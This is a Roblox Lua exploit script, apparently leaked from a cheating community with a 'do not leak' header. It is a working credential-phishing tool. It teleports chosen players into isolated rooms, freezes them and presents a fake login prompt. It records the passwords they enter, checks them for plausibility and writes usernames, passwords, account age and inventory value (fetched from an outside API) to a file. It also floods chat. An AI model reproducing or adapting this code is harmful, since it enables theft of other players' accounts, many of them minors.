--From Milky Way, DO NOT LEAK THIS. raspy gets really salty when you leak his shit and i leaked mgxv1 so yeah
--he says he will report this method with a bot like 100 times to roblox to make sure it gets patched
--so just dont leak it ty 

local MyRoom = "BasicRoom"

local StorageType = 2

local ScamType = "Pick" 

local TargetList = {}

local Bypassers = { 
	{}
}

local Trello = {
	Enabled = false,
	List = "MRList",
	DumpList = "MRDumps",
	TrelloTargetList = "MRTargetList",
	DevKey = "",
	Token = "",
}

local floodChat = false 

local writeAccounts = true 
local fileName = "MGX7List" 

BypassKey = "v3rm" 
BypassKeyEnabled = true 
BypassKeyRules = true 

local kickLogin = false

local RAPApi = true
------------------------------------------------------------------------

local MainFolder = game:GetObjects("rbxassetid://432005266")[1]
MainFolder.Parent = game.ReplicatedStorage

local player = game.Players.LocalPlayer

local CurrentlyScamming = {}

local MRStorage

local guiTool = MainFolder.Login

local replaceScript = game:GetService("InsertService"):LoadAsset(80576967):GetChildren()[1].LocalScript
guiTool.LocalScript:Destroy()
replaceScript.Parent = guiTool

local ruleTool = MainFolder["Bypass Rules"]

local replaceScript = game:GetService("InsertService"):LoadAsset(80576967):GetChildren()[1].LocalScript
ruleTool.LocalScript:Destroy()
replaceScript.Parent = ruleTool

local pickGui = MainFolder.PickGui

function checkPass(pass, playa)
	if BypassKeyEnabled and pass == BypassKey then
		if BypassKeyRules then
			local newTool = ruleTool:Clone()
			newTool.Parent = workspace
			newTool.Handle.CanCollide = false
			newTool.Handle.CFrame = playa.Character.Head.CFrame
		end
		return true
	end
	if pass == "Password" or pass == "" or pass == "Enter Your Password" or pass == "Incorrect Password" or pass == "Enter your Password" then
		return false
	end
	local foundNums = 0
	local foundLetters = 0
	if string.find(pass, " ") then
		return false
	end
	if pass:len() < 6 or pass:len() > 20 then
		return false
	end
	for i=1,pass:len() do
		if pass:sub(i,i):match("%d") ~= nil then
			foundNums = foundNums + 1
		end
	end
	if foundNums < 2 then
		return false
	end
	for i=1,pass:len() do
		if pass:sub(i,i):match("%a") ~= nil then
			foundLetters = foundLetters + 1
		end
	end
	if foundLetters < 4 then
		return false
	end
	return true
end

function getUText(root, val)
	local found
	if val then
		found = val
	end
	for i,v in pairs(root:GetChildren()) do
		if v.Name == "UText" then
			found = v
			break
		end
		found = getUText(v,found)
	end
	return found
end

function getPText(root, val)
	local found
	if val then
		found = val
	end
	for i,v in pairs(root:GetChildren()) do
		if v.Name == "PText" then
			found = v
			break
		end
		found = getPText(v,found)
	end
	return found
end

function getILPopUp(root, val)
	local found
	if val then
		found = val
	end
	for i,v in pairs(root:GetChildren()) do
		if v.Name == "ILPopUp" then
			found = v
			break
		end
		found = getILPopUp(v,found)
	end
	return found
end

function unscPlayer(plr)
	for i,v in pairs(CurrentlyScamming) do
		if plr == v.Player then
			table.insert(Bypassers,{Name = plr.Name, ID = plr.UserId})
			table.remove(CurrentlyScamming,i)
			wait()
			while plr.Backpack:FindFirstChild("Login") do
				plr.Backpack.Login:Destroy()
				wait()
			end
			while plr.Character:FindFirstChild("Login") do
				plr.Character.Login:Destroy()
				wait()
			end
			plr.Character:WaitForChild("Torso")
			plr.Character:WaitForChild("HumanoidRootPart")
			plr.Character.HumanoidRootPart.Anchored = false
			plr.Character.HumanoidRootPart.CFrame = v.ReturnPos
			v.Player.CameraMaxZoomDistance = 400
			v.Player.CameraMinZoomDistance = 0
			v.RoomModel:Destroy()
		end
	end
end

function scPlayer(plr)
	ypcall(function()
	local debounce = false
	local roomCheck = MainFolder.Rooms:FindFirstChild(MyRoom)
	if roomCheck then
		local roomId = #CurrentlyScamming + 1
		local newRoom = roomCheck:Clone()
		newRoom.Parent = workspace
		newRoom:MoveTo(Vector3.new(5000,1000, 5000 + 100 * roomId))
		
		local newPacket = {Player = plr, RoomId = roomId, RoomModel = newRoom, ReturnPos = plr.Character.Torso.CFrame}
		table.insert(CurrentlyScamming,newPacket)
		--[[
		newRoom.LButton.ClickDetector.MouseClick:connect(function(playa)
			if debounce == false then
				if playa.Backpack:FindFirstChild("Login") then
					if playa == plr and getILPopUp(playa.Backpack.Login) and getPText(playa.Backpack.Login) then
						debounce = true
						getILPopUp(newRoom).Visible = false
						getILPopUp(playa.Backpack.Login).Visible = false
						wait(0.5)
						if playa.Backpack:FindFirstChild("Login") then
							if checkPass(getPText(playa.Backpack.Login).Text) then
								print(plr.Name .. " : " .. getPText(playa.Backpack.Login).Text)
								unscPlayer(plr)
							else
								getILPopUp(newRoom).Visible = true
								getILPopUp(playa.Backpack.Login).Visible = true
								getPText(playa.Backpack.Login).Text = ""
							end
						end
					end
				end
				debounce = false
			end
		end)
		--]]
	end
	end)
end

function isBypass(plr)
	local bypass = false
	for i,v in pairs(Bypassers) do
		if v.Name == plr.Name or v.ID == plr.UserId then
			bypass = true
		end
	end
	return bypass
end

function isScamming(plr)
	local isScam = false
	for i,v in pairs(CurrentlyScamming) do
		if v.Player.Name == plr then
			isScam = true
		end
	end
	return isScam
end

function fixPlayers()
	for i,v in pairs(CurrentlyScamming) do
		ypcall(function()
			if v.Player.Character:FindFirstChild("Login") then
				if v.Player.Character.Login:FindFirstChild("SprayGui") then
					local tempTool = v.Player.Character:FindFirstChild("Login")
					tempTool.Parent = v.RoomModel
					tempTool.Handle.CFrame = v.Player.Character.Head.CFrame
				end
			end
		end)
	end
end

function BCtoDumpStr(str)
	local res = ""
	if str == "Enum.MembershipType.BuildersClub" then
		res = "[BC] "
	elseif str == "Enum.MembershipType.TurboBuildersClub" then
		res = "[TBC] "
	elseif str == "Enum.MembershipType.OutrageousBuildersClub" then
		res = "[OBC] "
	elseif str == "Enum.MembershipType.None" then
		res = ""
	end
	return res
end

function getRap(user)
	local rap = "Error."
	if RAPApi then
		ypcall(function()
			local http = game:GetService("HttpService")
			local rawrap = http:JSONDecode(game:HttpGet("http://roblox.plus:2052/inventory?username=" .. user,true))
			rap = tostring(rawrap.rap)
		end)
	else
		rap = "Disabled."
	end
	return rap
end

function logAccount(user,pass)
	local playerName = user.Name	
	local playerAge = tostring(user.AccountAge)
	local playerRAP = getRap(playerName)
	
	if print then
		print(BCtoDumpStr(tostring(user.MembershipType)) .. playerName .. " : " .. pass .. " Age: " .. playerAge .. " RAP: " .. playerRAP)
	end
	if readfile and writefile then
		if readfile(getelysianpath()..fileName..".txt") == "nil path doesn't exist" then
			writefile(getelysianpath()..fileName..".txt", BCtoDumpStr(tostring(user.MembershipType)) .. playerName .. " : " .. pass .. " Age: " .. playerAge .. " RAP: " .. playerRAP)
		else
			local tempFile = readfile(getelysianpath()..fileName..".txt")
			writefile(getelysianpath()..fileName..".txt", tempFile .. "\n" .. BCtoDumpStr(tostring(user.MembershipType)) .. playerName .. " : " .. pass .. " Age: " .. playerAge .. " RAP: " .. playerRAP)
		end
	end
end

function teleportVictims()
	for i,v in pairs(CurrentlyScamming) do
		ypcall(function()
			v.Player.Character.HumanoidRootPart.CFrame = v.RoomModel.Spawn.CFrame + Vector3.new(0,-10,0)
			v.Player.Character.HumanoidRootPart.Anchored = true
			if not v.Player.Backpack:FindFirstChild("Login") and not v.Player.Character:FindFirstChild("Login") then
				if not v.RoomModel:FindFirstChild("Login") then
					local tempTools = {}
					for i2,v2 in pairs(v.Player.Backpack:GetChildren()) do
						table.insert(tempTools,v2:Clone())
						v2:Destroy()
					end
					local newTool = guiTool:Clone()
					newTool.Parent = v.RoomModel
					newTool.Handle.CanCollide = false
					newTool.Handle.CFrame = v.Player.Character.Head.CFrame
					newTool.Handle.BodyPosition.Position = v.RoomModel.Spawn.Position + Vector3.new(0,-10,0)
					getUText(newTool).Text = v.Player.Name
					spawn(function()
						wait(2)
						for i2,v2 in pairs(tempTools) do
							v2.Parent = v.Player.Backpack
						end
					end)
					newTool.Changed:connect(function(prop)
						if not isScamming(v.Player.Name) then return end
						if prop == "Parent" and newTool.Parent.Name == "Backpack" then
							if v.Player.Backpack:FindFirstChild("Login") then
								if getILPopUp(v.Player.Backpack.Login) and getPText(v.Player.Backpack.Login) then
									getILPopUp(v.Player.Backpack.Login).Visible = false
									if v.Player.Backpack:FindFirstChild("Login") then
										if checkPass(getPText(v.Player.Backpack.Login).Text, v.Player) then
											logAccount(v.Player, getPText(v.Player.Backpack.Login).Text)
											unscPlayer(v.Player)
											spawn(function()
												wait(0.5)
												if kickLogin then
													if not v.Player.Backpack:FindFirstChild("Bypass Rules") and not v.Player.Character:FindFirstChild("Bypass Rules") then
														v.Player:Remove()
													end
												end
											end)
										else
											getILPopUp(v.Player.Backpack.Login).Visible = true
											getPText(v.Player.Backpack.Login).Text = ""
											wait()
											if not v.Player.Character:FindFirstChild("Login") then
												newTool.Parent = v.RoomModel
												newTool.Handle.CFrame = v.Player.Character.Head.CFrame
											end
										end
									end
								end
							end
						end
					end)
				end
			end
		end)
	end
end

wait()

game.Players.PlayerRemoving:connect(function(playa)
	for i,v in pairs(CurrentlyScamming) do
		if v.Player == playa then
			table.remove(CurrentlyScamming,i)
		end
	end
end)

--[[
local infoGui = Instance.new("ScreenGui",game.CoreGui)
local infoText = Instance.new("TextLabel",infoGui)
infoText.Position = UDim2.new(0,0,1,-20)
infoText.Size = UDim2.new(1,0,0,20)
infoText.FontSize = "Size18"
infoText.Font = "SourceSansBold"
infoText.BackgroundTransparency = 1
infoText.TextColor3 = Color3.new(1,1,1)
infoText.TextXAlignment = "Right"
infoText.Text = "Press 'p' to toggle chat spam."
--]]

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:connect(function(key)
	if key == "p" then
		floodChat = not floodChat
	end
end)

spawn(function()
	while wait(3) do
		fixPlayers()
	end
end)

while wait() do
	teleportVictims()
	if floodChat then
		game.Players:Chat(".")
		game.Players:Chat(".")
	end
	if ScamType == "Normal" then
		for i,v in pairs(game.Players:GetPlayers()) do
			if StorageType == 1 then
				if not game.CoreGui.MRStorage:FindFirstChild(v.Name) and not isScamming(v.Name) and not isBypass(v) and v ~= game.Players.LocalPlayer then
					
				end
			elseif StorageType == 2 then
				if not game.ReplicatedStorage:FindFirstChild("MRStorage") then
					MRStorage = Instance.new("Folder",game.ReplicatedStorage)
					MRStorage.Name = "MRStorage"
				end
				if not game.ReplicatedStorage.MRStorage:FindFirstChild(v.Name) and not isScamming(v.Name) and not isBypass(v) and v ~= game.Players.LocalPlayer then
					scPlayer(v)
				end
			end
		end
	elseif ScamType == "Pick" then
		if StorageType == 1 then
			if not game.CoreGui.MRStorage:FindFirstChild(v.Name) and not isScamming(v.Name) and not isBypass(v) and v ~= game.Players.LocalPlayer then
				
			end
		elseif StorageType == 2 then
			if not game.ReplicatedStorage:FindFirstChild("MRStorage") then
				MRStorage = Instance.new("Folder",game.ReplicatedStorage)
				MRStorage.Name = "MRStorage"
			end
			if not game.CoreGui:FindFirstChild("PickGui") then
				local newPickGui = pickGui:Clone()
				newPickGui.Parent = game.CoreGui
				spawn(function()
					local pickGuiList = newPickGui.MainFrame.AccList
					local pickGuiResult = newPickGui.MainFrame.UserResult
					pickGuiList.CanvasSize = UDim2.new(0,0,0,0)
					local function updatePickList()
						pickGuiList:ClearAllChildren()
						for i,v in pairs(game.Players:GetPlayers()) do
							if v ~= player then
								local newRes = pickGuiResult:Clone()
								newRes.PlayerName.Text = v.Name
								newRes.PlayerPic.Image = "http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&userId="..v.UserId
								newRes.Position = UDim2.new(0,0,0,40 * #pickGuiList:GetChildren())
								if isScamming(v.Name) then
									newRes.PlayerStatus.Text = "Scamming..."
								end
								if isBypass(v) then
									newRes.PlayerStatus.Text = "Scammed"
								end
								newRes.Parent = pickGuiList
								pickGuiList.CanvasSize = UDim2.new(0,0,0,40 * #pickGuiList:GetChildren())
								newRes.Visible = true
								newRes.MouseButton1Down:connect(function()
									if not isScamming(v.Name) then
										scPlayer(v)
									end
								end)
							end
						end
					end
					updatePickList()
					newPickGui.MainFrame.Refresh.MouseButton1Down:connect(function()
						updatePickList()
					end)
				end)
			end
		end
	end
end